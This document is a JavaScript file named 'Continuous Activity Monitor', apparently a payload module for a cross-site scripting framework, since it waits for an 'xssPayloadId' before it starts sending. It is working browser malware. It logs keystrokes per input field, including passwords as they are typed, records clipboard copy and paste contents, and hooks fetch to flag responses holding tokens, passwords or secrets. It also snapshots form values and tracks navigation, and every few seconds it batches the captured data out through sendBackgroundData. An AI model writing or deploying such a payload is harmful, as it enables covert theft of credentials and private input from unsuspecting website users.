// Name: Continuous Activity Monitor
// Description: Comprehensive background monitoring with keylogging, clipboard tracking, form monitoring, and AJAX interception. Properly uses sendBackgroundData for continuous collection.

(function() {
  const session = {
    id: 'sess_' + Math.random().toString(36).substr(2, 9),
    startTime: Date.now(),
    keystrokes: [],
    clipboard: [],
    forms: {},
    navigation: [],
    ajax: [],
    currentInput: '',
    lastTarget: null,
    totalKeys: 0,
    totalEvents: 0
  };

  // Initial setup notification
  window.addCustomData({
    title: "Monitor Initialized",
    data: {
      sessionId: session.id,
      monitors: ['keylogger', 'clipboard', 'forms', 'navigation', 'ajax'],
      startTime: new Date().toISOString()
    }
  });

  // === Keylogger Setup ===
  document.addEventListener('keydown', function(e) {
    try {
      const target = e.target;
      const targetId = target.id || target.name || target.className || 'unknown';

      if (target !== session.lastTarget) {
        if (session.currentInput.length > 0 && session.lastTarget) {
          const lastTargetId = session.lastTarget.id || session.lastTarget.name || session.lastTarget.className || 'unknown';
          session.forms[lastTargetId] = session.currentInput;
        }
        session.currentInput = '';
        session.lastTarget = target;
      }

      if (e.key.length === 1) {
        session.currentInput += e.key;
        session.totalKeys++;
      } else if (e.key === 'Backspace') {
        session.currentInput = session.currentInput.slice(0, -1);
      } else if (e.key === 'Enter') {
        session.keystrokes.push({
          field: targetId,
          value: session.currentInput,
          timestamp: Date.now()
        });
        session.currentInput = '';
      }
    } catch (err) {}
  });

  // === Clipboard Monitoring ===
  document.addEventListener('copy', function(e) {
    try {
      const selection = window.getSelection().toString();
      if (selection) {
        session.clipboard.push({
          action: 'copy',
          content: selection.substring(0, 200),
          timestamp: Date.now()
        });
        session.totalEvents++;
      }
    } catch (err) {}
  });

  document.addEventListener('paste', function(e) {
    try {
      const pasteData = e.clipboardData || window.clipboardData;
      const pasted = pasteData.getData('text');

      if (pasted) {
        session.clipboard.push({
          action: 'paste',
          content: pasted.substring(0, 200),
          target: e.target.id || e.target.name || 'unknown',
          timestamp: Date.now()
        });
        session.totalEvents++;
      }
    } catch (err) {}
  });

  // === Navigation Tracking ===
  let lastUrl = location.href;
  function checkNavigation() {
    if (location.href !== lastUrl) {
      session.navigation.push({
        from: lastUrl,
        to: location.href,
        timestamp: Date.now()
      });
      lastUrl = location.href;
      session.totalEvents++;
    }
  }

  // === AJAX/Fetch Interception ===
  const originalFetch = window.fetch;
  window.fetch = function(...args) {
    const [url, options = {}] = args;

    session.ajax.push({
      type: 'fetch',
      url: typeof url === 'string' ? url : url.toString(),
      method: options.method || 'GET',
      timestamp: Date.now()
    });
    session.totalEvents++;

    return originalFetch.apply(this, args).then(response => {
      const clonedResponse = response.clone();

      if (response.ok && response.headers.get('content-type')?.includes('json')) {
        clonedResponse.json().then(data => {
          if (data && typeof data === 'object') {
            const sensitive = [];
            const str = JSON.stringify(data).toLowerCase();

            if (str.includes('token')) sensitive.push('token');
            if (str.includes('password')) sensitive.push('password');
            if (str.includes('secret')) sensitive.push('secret');
            if (str.includes('key')) sensitive.push('key');

            if (sensitive.length > 0) {
              session.ajax.push({
                type: 'response',
                url: url,
                sensitiveFields: sensitive,
                timestamp: Date.now()
              });
            }
          }
        }).catch(() => {});
      }

      return response;
    });
  };

  // === Wait for payload ID then start background monitoring ===
  setTimeout(function waitForPayload() {
    if (!window.xssPayloadId) {
      setTimeout(waitForPayload, 1000);
      return;
    }

    console.log('Payload ID available, starting background monitoring');

    // === Send keystroke batches every 10 seconds ===
    setInterval(function() {
      if (session.keystrokes.length > 0 || session.currentInput.length > 0) {
        if (session.currentInput.length > 0 && session.lastTarget) {
          const targetId = session.lastTarget.id || session.lastTarget.name || session.lastTarget.className || 'unknown';
          session.keystrokes.push({
            field: targetId,
            value: session.currentInput,
            partial: true,
            timestamp: Date.now()
          });
        }

        window.sendBackgroundData({
          title: "Keystroke Batch",
          data: {
            sessionId: session.id,
            keystrokes: session.keystrokes.splice(0, 50),
            totalKeysPressed: session.totalKeys,
            timestamp: new Date().toISOString()
          }
        });
      }
    }, 10000);

    // === Send clipboard events every 15 seconds ===
    setInterval(function() {
      if (session.clipboard.length > 0) {
        window.sendBackgroundData({
          title: "Clipboard Activity",
          data: {
            sessionId: session.id,
            events: session.clipboard.splice(0, 20),
            timestamp: new Date().toISOString()
          }
        });
      }
    }, 15000);

    // === Form snapshot every 20 seconds ===
    setInterval(function() {
      const formData = {};
      let hasData = false;

      document.querySelectorAll('input, textarea, select').forEach(function(el) {
        if (el.value && el.type !== 'hidden' && el.type !== 'submit' && el.type !== 'button') {
          const key = el.name || el.id || el.placeholder || el.className || 'field_' + Math.random().toString(36).substr(2, 5);
          formData[key] = el.type === 'password' ? '*'.repeat(el.value.length) : el.value.substring(0, 100);
          hasData = true;
        }
      });

      if (hasData) {
        window.sendBackgroundData({
          title: "Form Snapshot",
          data: {
            sessionId: session.id,
            forms: formData,
            url: location.href,
            timestamp: new Date().toISOString()
          }
        });
      }
    }, 20000);

    // === Navigation and AJAX batch every 30 seconds ===
    setInterval(function() {
      checkNavigation();

      if (session.navigation.length > 0 || session.ajax.length > 0) {
        window.sendBackgroundData({
          title: "Navigation & AJAX",
          data: {
            sessionId: session.id,
            navigation: session.navigation.splice(0, 10),
            ajax: session.ajax.splice(0, 20),
            currentUrl: location.href,
            timestamp: new Date().toISOString()
          }
        });
      }
    }, 30000);

    // === Session heartbeat every 45 seconds ===
    setInterval(function() {
      checkNavigation();

      const runtime = Math.floor((Date.now() - session.startTime) / 1000);
      const minutes = Math.floor(runtime / 60);
      const seconds = runtime % 60;

      window.sendBackgroundData({
        title: "Session Heartbeat",
        data: {
          sessionId: session.id,
          runtime: `${minutes}m ${seconds}s`,
          stats: {
            totalKeysPressed: session.totalKeys,
            totalEvents: session.totalEvents,
            pendingKeystrokes: session.keystrokes.length,
            pendingClipboard: session.clipboard.length,
            capturedForms: Object.keys(session.forms).length
          },
          currentUrl: location.href,
          timestamp: new Date().toISOString()
        }
      });
    }, 45000);

    // === Monitor DOM changes for dynamic content ===
    let lastDOMCheck = Date.now();
    const observer = new MutationObserver(function(mutations) {
      const now = Date.now();
      if (now - lastDOMCheck > 5000) {
        lastDOMCheck = now;

        let newForms = 0;
        let newInputs = 0;

        mutations.forEach(mutation => {
          mutation.addedNodes.forEach(node => {
            if (node.nodeType === 1) {
              if (node.tagName === 'FORM') newForms++;
              if (node.tagName === 'INPUT' || node.tagName === 'TEXTAREA') newInputs++;

              const inputs = node.querySelectorAll ? node.querySelectorAll('input, textarea') : [];
              newInputs += inputs.length;
            }
          });
        });

        if (newForms > 0 || newInputs > 0) {
          window.sendBackgroundData({
            title: "DOM Changes",
            data: {
              sessionId: session.id,
              newForms: newForms,
              newInputs: newInputs,
              timestamp: new Date().toISOString()
            }
          });
        }
      }
    });

    observer.observe(document.body, {
      childList: true,
      subtree: true
    });

  }, 2000);

})();